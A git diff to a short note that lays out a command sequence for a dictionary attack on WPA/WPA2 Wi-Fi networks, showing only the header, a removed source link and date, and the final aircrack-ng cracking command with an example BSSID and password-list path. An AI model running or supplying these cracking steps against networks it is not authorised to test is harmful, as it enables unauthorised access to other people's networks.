@@ -1,8 +1,7 @@
 # wifi_hacking_command_sequence-
 # Execute dictionary attack to Wi-Fi Network
 # 
-# http://ourcodeworld.com/articles/read/407/how-to-hack-a-wi-fi-network-wpa-wpa2-through-a-dictionary-attack-with-kali-linux
-# March - 2017
+# 
 
 
 # List interfaces (sh)
@@ -59,3 +58,5 @@ aircrack-ng -a2 -b [BSSID] -w [path to dictionary] [path to .cap files of handsh
 # Example: aircrack-ng -a2 -b E0:98:61:47:BD:E2 -w /root/hacking/passwords.txt /root/hacking/*.cap
 
 # That's all !
+
+
